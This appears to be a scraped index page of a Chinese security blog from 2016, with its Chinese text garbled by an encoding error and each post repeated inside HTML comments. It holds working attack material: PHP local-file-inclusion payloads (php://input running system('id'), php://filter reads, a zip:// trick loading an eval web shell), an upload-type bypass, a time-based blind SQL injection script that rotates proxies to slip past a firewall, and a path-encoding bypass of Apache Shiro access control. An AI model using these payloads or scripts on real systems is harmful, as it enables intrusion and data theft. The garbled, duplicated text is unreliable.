<pre class="line-numbers language-none"><code class="language-none">index.php:

&lt;?php
    $b&#x3D;$_REQUEST[&quot;b&quot;];
    @include($b);
 ?&gt;
 
EXP:

GET http:&#x2F;&#x2F;evil.com&#x2F;index.php?php:&#x2F;&#x2F;input
&lt;?php system(&quot;id&quot;)?&gt;

è·å–æ–‡ä»¶å†…å®¹ï¼š
&lt;?php echo file_get_contents(&quot;info.php&quot;);?&gt; &#x2F;&#x2F;æµ‹è¯•å¯ç”¨
&lt;?php echo base64_encode(file_get_contents(&quot;info.php&quot;));?&gt;  &#x2F;&#x2F;http:&#x2F;&#x2F;www.cnblogs.com&#x2F;LittleHann&#x2F;p&#x2F;3665062.html é˜²æ­¢è·å–&#96;.php&#96;æ–‡ä»¶çš„æ—¶å€™phpæ‰§è¡Œï¼Œå…ˆbase64ç¼–ç ä¸‹ï¼Œä½†æ˜¯å®é™…æµ‹è¯•ä¸Šè¿°å³å¯ç”¨ã€‚phpåœ¨4ç‚¹å¤šçš„ç‰ˆæœ¬ä½¿ç”¨è¿™ä¸ªå¯ä»¥è¯»å‡ºæ¥


fimap.py ç±»ä¼¼sqlmap.pyï¼Œç”¨æ¥æ–‡ä»¶åŒ…å«æ‰«æï¼Œå¯ä»¥è·å–ä¸€ä¸ªäº¤äº’shell
å¦å¤–ä¸€ä¸ªphpä¼ªåè®®ï¼š
 
file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;image.php
ç”¨æ¥è¯»å–phpæ–‡ä»¶ã€‚
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>$_FILES[â€œfileâ€][â€œtypeâ€]</code><br>è¿™ä¸ªå‚æ•°æ˜¯æµè§ˆå™¨ç”Ÿæˆä¼ é€’ç»™æœåŠ¡ç«¯çš„ï¼Œè™½ç„¶ä¸æ˜¯ç”¨æˆ·è¾“å…¥æ•°æ®ï¼Œä½†æ˜¯æ˜¯å±äºå®¢æˆ·ç«¯ä¼ é€’è¿‡æ¥çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·å…¶å®æ˜¯å¯ä»¥æ§åˆ¶è¿™ä¸ªå‚æ•°çš„ã€‚åªéœ€è¦ä¿®æ”¹Content-Type: image/jpeg å°±å¯ä»¥ç»•è¿‡è¿™ä¸ªæ£€æŸ¥ï¼Œä¸Šä¼ ä»»æ„ç±»å‹çš„æ–‡ä»¶ã€‚</p>
<h3 id="phpçš„zipä¼ªåè®®"><a href="#phpçš„zipä¼ªåè®®" class="headerlink" title="phpçš„zipä¼ªåè®®"></a>phpçš„zipä¼ªåè®®</h3><p>å‡è®¾æœ‰ä»¥ä¸‹çš„ä»£ç ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">file.php:

&lt;?php
@include($_GET[&#39;a&#39;].&quot;.jpg&quot;);
@include($_GET[&#39;b&#39;].&quot;.php&quot;);

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ˜ç»†çš„åŒ…å«ï¼Œå¯¹äºå‚æ•°aå’Œå‚æ•°bå¯ä»¥è¿™æ ·æ¥è§£å†³ï¼Œæ¯”å¦‚æœ‰ä¸€ä¸ª</p>
<pre class="line-numbers language-none"><code class="language-none">shell.php:

&lt;?php eval($_GET[&#39;c&#39;]);?&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>aå‚æ•°æœ€ç»ˆåŒ…å«çš„æ˜¯ä¸€ä¸ªjpgï¼Œbå‚æ•°æ˜¯ä¸€ä¸ªphp</p>
<pre class="line-numbers language-none"><code class="language-none">å¯¹äºaæ¥è¯´ï¼š
mv shell.php shell.jpg
zip a.zip shell.jpg

è®¿é—®: http:&#x2F;&#x2F;evil.com&#x2F;file.php?a&#x3D;zip:&#x2F;&#x2F;a.zip%23shell&amp;c&#x3D;phpinfo();

å¯¹äºbæ¥è¯´ï¼š
zip b.zip shell.php

è®¿é—®: http:&#x2F;&#x2F;evil.com&#x2F;file.php?b&#x3D;zip:&#x2F;&#x2F;b.zip%23shell&amp;c&#x3D;phpinfo();
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2016/12/28/phpçš„zipä¼ªåè®®.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>php://inputéœ€è¦æœåŠ¡å™¨çš„æ”¯æŒï¼ŒåŒæ—¶è¦æ±‚â€allow_url_includeâ€è®¾ç½®ä¸ºOnï¼Œåœ¨PHPçš„é…ç½®æ–‡ä»¶php.inié…ç½®ã€‚å¯¹äºä¸€ä¸ªLFIäº§ç”Ÿçš„æ¼æ´æ¯”å¦‚ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">index.php:

&lt;?php
    $b&#x3D;$_REQUEST[&quot;b&quot;];
    @include($b);
 ?&gt;
 
EXP:

GET http:&#x2F;&#x2F;evil.com&#x2F;index.php?php:&#x2F;&#x2F;input
&lt;?php system(&quot;id&quot;)?&gt;

è·å–æ–‡ä»¶å†…å®¹ï¼š
&lt;?php echo file_get_contents(&quot;info.php&quot;);?&gt; &#x2F;&#x2F;æµ‹è¯•å¯ç”¨
&lt;?php echo base64_encode(file_get_contents(&quot;info.php&quot;));?&gt;  &#x2F;&#x2F;http:&#x2F;&#x2F;www.cnblogs.com&#x2F;LittleHann&#x2F;p&#x2F;3665062.html é˜²æ­¢è·å–&#96;.php&#96;æ–‡ä»¶çš„æ—¶å€™phpæ‰§è¡Œï¼Œå…ˆbase64ç¼–ç ä¸‹ï¼Œä½†æ˜¯å®é™…æµ‹è¯•ä¸Šè¿°å³å¯ç”¨ã€‚phpåœ¨4ç‚¹å¤šçš„ç‰ˆæœ¬ä½¿ç”¨è¿™ä¸ªå¯ä»¥è¯»å‡ºæ¥


fimap.py ç±»ä¼¼sqlmap.pyï¼Œç”¨æ¥æ–‡ä»¶åŒ…å«æ‰«æï¼Œå¯ä»¥è·å–ä¸€ä¸ªäº¤äº’shell
å¦å¤–ä¸€ä¸ªphpä¼ªåè®®ï¼š
 
file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;image.php
ç”¨æ¥è¯»å–phpæ–‡ä»¶ã€‚
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>$_FILES[â€œfileâ€][â€œtypeâ€]</code><br>è¿™ä¸ªå‚æ•°æ˜¯æµè§ˆå™¨ç”Ÿæˆä¼ é€’ç»™æœåŠ¡ç«¯çš„ï¼Œè™½ç„¶ä¸æ˜¯ç”¨æˆ·è¾“å…¥æ•°æ®ï¼Œä½†æ˜¯æ˜¯å±äºå®¢æˆ·ç«¯ä¼ é€’è¿‡æ¥çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯ç”¨æˆ·å…¶å®æ˜¯å¯ä»¥æ§åˆ¶è¿™ä¸ªå‚æ•°çš„ã€‚åªéœ€è¦ä¿®æ”¹Content-Type: image/jpeg å°±å¯ä»¥ç»•è¿‡è¿™ä¸ªæ£€æŸ¥ï¼Œä¸Šä¼ ä»»æ„ç±»å‹çš„æ–‡ä»¶ã€‚</p>
<h3 id="phpçš„zipä¼ªåè®®"><a href="#phpçš„zipä¼ªåè®®" class="headerlink" title="phpçš„zipä¼ªåè®®"></a>phpçš„zipä¼ªåè®®</h3><p>å‡è®¾æœ‰ä»¥ä¸‹çš„ä»£ç ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">file.php:

&lt;?php
@include($_GET[&#39;a&#39;].&quot;.jpg&quot;);
@include($_GET[&#39;b&#39;].&quot;.php&quot;);

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ˜ç»†çš„åŒ…å«ï¼Œå¯¹äºå‚æ•°aå’Œå‚æ•°bå¯ä»¥è¿™æ ·æ¥è§£å†³ï¼Œæ¯”å¦‚æœ‰ä¸€ä¸ª</p>
<pre class="line-numbers language-none"><code class="language-none">shell.php:

&lt;?php eval($_GET[&#39;c&#39;]);?&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>aå‚æ•°æœ€ç»ˆåŒ…å«çš„æ˜¯ä¸€ä¸ªjpgï¼Œbå‚æ•°æ˜¯ä¸€ä¸ªphp</p>
<pre class="line-numbers language-none"><code class="language-none">å¯¹äºaæ¥è¯´ï¼š
mv shell.php shell.jpg
zip a.zip shell.jpg

è®¿é—®: http:&#x2F;&#x2F;evil.com&#x2F;file.php?a&#x3D;zip:&#x2F;&#x2F;a.zip%23shell&amp;c&#x3D;phpinfo();

å¯¹äºbæ¥è¯´ï¼š
zip b.zip shell.php

è®¿é—®: http:&#x2F;&#x2F;evil.com&#x2F;file.php?b&#x3D;zip:&#x2F;&#x2F;b.zip%23shell&amp;c&#x3D;phpinfo();
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2016/12/28/phpçš„zipä¼ªåè®®.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/11/08/sql-proxy.html" >Sqlä»£ç†æ³¨å…¥</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-11-08  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># coding: utf-8</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

target <span class="token operator">=</span> <span class="token string">'http://www.vulnerable.com'</span>
headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
	<span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"www.vulnerable.com"</span><span class="token punctuation">,</span>
	<span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"</span> <span class="token punctuation">,</span>
	<span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'close'</span><span class="token punctuation">,</span>
	<span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3"</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"f4udpabdluoed7ldhfp90"</span><span class="token punctuation">&#125;</span>
	payload <span class="token operator">=</span> <span class="token string">"1' or select if(length(user())=&#123;&#125;,sleep(15),1) or '1'='1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
	data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"userpwd"</span><span class="token punctuation">:</span> <span class="token string">"abc"</span><span class="token punctuation">&#125;</span>

	<span class="token keyword">def</span> <span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
			r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://127.0.0.1:1111/time&lt;4"</span><span class="token punctuation">)</span>
			proxy <span class="token operator">=</span> r<span class="token punctuation">.</span>content<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"[\"]"</span><span class="token punctuation">)</span>
			ab <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
			<span class="token keyword">try</span><span class="token punctuation">:</span>
				test <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://www.vulnerable.com"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
				<span class="token keyword">if</span> test<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
					<span class="token keyword">return</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> ab<span class="token punctuation">)</span><span class="token punctuation">,</span> proxy
			<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
				<span class="token keyword">pass</span>

	<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
		testtime<span class="token punctuation">,</span> proxy <span class="token operator">=</span> val<span class="token punctuation">(</span><span class="token punctuation">)</span>
		now <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token keyword">try</span><span class="token punctuation">:</span>
			req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span>
			<span class="token keyword">if</span> req<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
				<span class="token keyword">print</span> <span class="token string">"[*]i:%s, before:%s, now:%s, Cost:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> now<span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span>
				<span class="token keyword">print</span> <span class="token string">"[*]proxy:%s, Content:%s, Testtime:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> testtime<span class="token punctuation">)</span>
				<span class="token keyword">print</span> <span class="token string">"[*]TimeCompare: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span> <span class="token operator">-</span> testtime<span class="token punctuation">)</span>
				<span class="token keyword">print</span> <span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">30</span>
				<span class="token keyword">break</span>
		<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
			<span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¼€ä¸ªproxypool.pyï¼Œç„¶å<code>http://127.0.0.1:1111/time&lt;4</code>æ‰¾ä¸ªç¨å¾®å¥½ç‚¹çš„ä»£ç†ï¼Œå°±è¿™æ ·å¾ªç¯ä¸‹å»å§ï¼Œè¿™æ ·æ¯æ¬¡è¯·æ±‚ç›®æ ‡ä¹‹åï¼Œéƒ½ä¼šåˆ‡æ¢åˆ°ä¸‹ä¸ªä»£ç†ã€‚æ‰€ä»¥å°±ä¸ä¼šè§¦å‘é˜²ç«å¢™å•¦ï¼Œå…·ä½“æ•ˆæœå†è¯´ã€‚</p>
<p>å®æµ‹è¿˜æ²¡æµ‹å‡ºæ¥ï¼Œæ„Ÿè§‰æœ‰ç‚¹æ‚¬ã€‚</p>

	

	</div>
  <a type="button" href="/2016/11/08/sql-proxy.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
<span class="token comment"># coding: utf-8</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

target <span class="token operator">=</span> <span class="token string">'http://www.vulnerable.com'</span>
headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
	<span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"www.vulnerable.com"</span><span class="token punctuation">,</span>
	<span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"</span> <span class="token punctuation">,</span>
	<span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'close'</span><span class="token punctuation">,</span>
	<span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3"</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	cookies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"PHPSESSID"</span><span class="token punctuation">:</span> <span class="token string">"f4udpabdluoed7ldhfp90"</span><span class="token punctuation">&#125;</span>
	payload <span class="token operator">=</span> <span class="token string">"1' or select if(length(user())=&#123;&#125;,sleep(15),1) or '1'='1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
	data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span> <span class="token string">"userpwd"</span><span class="token punctuation">:</span> <span class="token string">"abc"</span><span class="token punctuation">&#125;</span>

	<span class="token keyword">def</span> <span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
		<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
			r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://127.0.0.1:1111/time&lt;4"</span><span class="token punctuation">)</span>
			proxy <span class="token operator">=</span> r<span class="token punctuation">.</span>content<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"[\"]"</span><span class="token punctuation">)</span>
			ab <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
			<span class="token keyword">try</span><span class="token punctuation">:</span>
				test <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://www.vulnerable.com"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
				<span class="token keyword">if</span> test<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
					<span class="token keyword">return</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> ab<span class="token punctuation">)</span><span class="token punctuation">,</span> proxy
			<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
				<span class="token keyword">pass</span>

	<span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
		testtime<span class="token punctuation">,</span> proxy <span class="token operator">=</span> val<span class="token punctuation">(</span><span class="token punctuation">)</span>
		now <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
		<span class="token keyword">try</span><span class="token punctuation">:</span>
			req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>target<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"http"</span><span class="token punctuation">:</span> proxy<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">200</span><span class="token punctuation">)</span>
			<span class="token keyword">if</span> req<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
				<span class="token keyword">print</span> <span class="token string">"[*]i:%s, before:%s, now:%s, Cost:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> now<span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span>
				<span class="token keyword">print</span> <span class="token string">"[*]proxy:%s, Content:%s, Testtime:%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>proxy<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> testtime<span class="token punctuation">)</span>
				<span class="token keyword">print</span> <span class="token string">"[*]TimeCompare: %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>now<span class="token punctuation">)</span> <span class="token operator">-</span> testtime<span class="token punctuation">)</span>
				<span class="token keyword">print</span> <span class="token string">"="</span> <span class="token operator">*</span> <span class="token number">30</span>
				<span class="token keyword">break</span>
		<span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
			<span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¼€ä¸ªproxypool.pyï¼Œç„¶å<code>http://127.0.0.1:1111/time&lt;4</code>æ‰¾ä¸ªç¨å¾®å¥½ç‚¹çš„ä»£ç†ï¼Œå°±è¿™æ ·å¾ªç¯ä¸‹å»å§ï¼Œè¿™æ ·æ¯æ¬¡è¯·æ±‚ç›®æ ‡ä¹‹åï¼Œéƒ½ä¼šåˆ‡æ¢åˆ°ä¸‹ä¸ªä»£ç†ã€‚æ‰€ä»¥å°±ä¸ä¼šè§¦å‘é˜²ç«å¢™å•¦ï¼Œå…·ä½“æ•ˆæœå†è¯´ã€‚</p>
<p>å®æµ‹è¿˜æ²¡æµ‹å‡ºæ¥ï¼Œæ„Ÿè§‰æœ‰ç‚¹æ‚¬ã€‚</p>

	
	</div>
  <a type="button" href="/2016/11/08/sql-proxy.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/10/25/cve-2016-6802.html" >CVE-2016-6802</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-10-25  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>Apache Shiro before 1.3.2 allows attackers to bypass intended servlet filters and gain access by leveraging use of a non-root servlet context path. </p>
</blockquote>
<p>æè¿°æ¯”è¾ƒç®€å•ï¼Œå®˜æ–¹ä¿®æ”¹çš„æ—¶å€™å¯¹äºæœ€æ–°ç‰ˆæœ¬åšäº†ç®€å•çš„ä¿®æ”¹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">
WebUtils.java
+ contextPath &#x3D; normalize(decodedRequestString(request, contextPath));
if (&quot;&#x2F;&quot;.equeal(contextPath)) &#123;
    contextPath &#x3D; &quot;&quot;;
 &#125;
 return contextPath;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸»è¦æ·»åŠ äº†ä¸Šé¢ä¸€è¡Œï¼Œåœ¨è¯·æ±‚å¤„ç†ä¹‹å‰å…ˆdecodedï¼Œç„¶åæ¢å¤æ­£å¸¸ã€‚æ‰€ä»¥æœ€åçš„expå¾ˆç®€å•ï¼š</p>
<p>æ¯”å¦‚ä½œä¸ºä¸€ä¸ªæ™®é€šè´¦æˆ·çš„æ—¶å€™ï¼ŒçŸ¥é“adminè·¯å¾„ï¼Œåœ¨è®¿é—®çš„æ—¶å€™è®¿é—®adminè·¯å¾„ï¼Œç„¶åburpæˆªæ–­ï¼Œåœ¨è¯·æ±‚è·¯å¾„åé¢æ·»åŠ <code>%2f</code>ï¼Œå³å¯ç»•è¿‡shiroè·¯å¾„æ§åˆ¶ã€‚</p>

	

	</div>
  <a type="button" href="/2016/10/25/cve-2016-6802.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>Apache Shiro before 1.3.2 allows attackers to bypass intended servlet filters and gain access by leveraging use of a non-root servlet context path. </p>
</blockquote>
<p>æè¿°æ¯”è¾ƒç®€å•ï¼Œå®˜æ–¹ä¿®æ”¹çš„æ—¶å€™å¯¹äºæœ€æ–°ç‰ˆæœ¬åšäº†ç®€å•çš„ä¿®æ”¹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">
WebUtils.java
+ contextPath &#x3D; normalize(decodedRequestString(request, contextPath));
if (&quot;&#x2F;&quot;.equeal(contextPath)) &#123;
    contextPath &#x3D; &quot;&quot;;
 &#125;
 return contextPath;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸»è¦æ·»åŠ äº†ä¸Šé¢ä¸€è¡Œï¼Œåœ¨è¯·æ±‚å¤„ç†ä¹‹å‰å…ˆdecodedï¼Œç„¶åæ¢å¤æ­£å¸¸ã€‚æ‰€ä»¥æœ€åçš„expå¾ˆç®€å•ï¼š</p>
<p>æ¯”å¦‚ä½œä¸ºä¸€ä¸ªæ™®é€šè´¦æˆ·çš„æ—¶å€™ï¼ŒçŸ¥é“adminè·¯å¾„ï¼Œåœ¨è®¿é—®çš„æ—¶å€™è®¿é—®adminè·¯å¾„ï¼Œç„¶åburpæˆªæ–­ï¼Œåœ¨è¯·æ±‚è·¯å¾„åé¢æ·»åŠ <code>%2f</code>ï¼Œå³å¯ç»•è¿‡shiroè·¯å¾„æ§åˆ¶ã€‚</p>

	
	</div>
  <a type="button" href="/2016/10/25/cve-2016-6802.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/10/08/docker.html" >Dockerç¬”è®°</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-10-08  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<ul>
<li>Docker container(å®¹å™¨): åº”ç”¨åœ¨å†…éƒ¨è·‘ï¼Œæœ‰è‡ªå·±å®Œæ•´çš„æ–‡ä»¶ç³»ç»Ÿå’Œæ“ä½œç³»ç»Ÿã€‚</li>
<li>Docker image(é•œåƒ): åº”ç”¨ä»£ç å„ç§åº“å’Œæ–‡ä»¶æ‰“åŒ…ä¸€ä¸ªæ–‡ä»¶ï¼Œè¿™ä¸ªå°±æ˜¯imageï¼Œéœ€è¦åŠ è½½åˆ°å®¹å™¨æ‰èƒ½è¿è¡Œã€‚</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> info  <span class="token comment">#åˆ—å‡ºcontainerå’Œimageçš„æ•°é‡ï¼Œå®¿ä¸»æ“ä½œç³»ç»Ÿç­‰</span>

<span class="token function">docker</span> run -t -i ubuntu /bin/bash
